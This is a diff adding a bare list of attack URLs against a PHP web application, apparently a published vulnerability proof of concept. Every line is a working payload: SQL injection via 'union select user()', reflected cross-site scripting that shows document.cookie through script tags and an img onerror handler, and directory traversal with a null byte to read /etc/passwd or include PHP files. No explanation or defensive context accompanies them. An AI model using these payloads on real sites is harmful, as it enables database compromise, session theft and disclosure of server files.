@@ -1,0 +1,11 @@
+http://www.example.com/home/demo1/index.php?target=articles&subtarget=Article_Detail&selected=50+union+select+user%28%29,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24+--+
+http://www.example.com/home/demo1/index.php?target=search&subtarget=top&searchstring=%27/**/SQL_CODE
+
+http://www.example.com/home/demo1/index.php?target=articles&subtarget=X%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+http://www.example.com/home/demo1/index.php?target=search&subtarget=top&searchstring=%3Cimg+src=0+onerror=alert%28document.cookie%29%3E
+http://www.example.com/home/demo1/manage.php?target=Home&subtarget=top%27%22%3E%3Cscript%3Ealert%28document.cookie%29%3C/script%3E
+
+http://www.example.com/home/demo1/manage.php?target=./../../../../../../../../../../../../etc/passwd%00
+http://www.example.com/home/demo1/manage.php?target=./../../../../../../../../../../../../path/to/php_file%00
+http://www.example.com/home/demo1/index.php?target=./../../../../../../../../../../../../etc/passwd%00
+http://www.example.com/home/demo1/index.php?target=./../../../../../../../../../../../../path/to/php_file%00
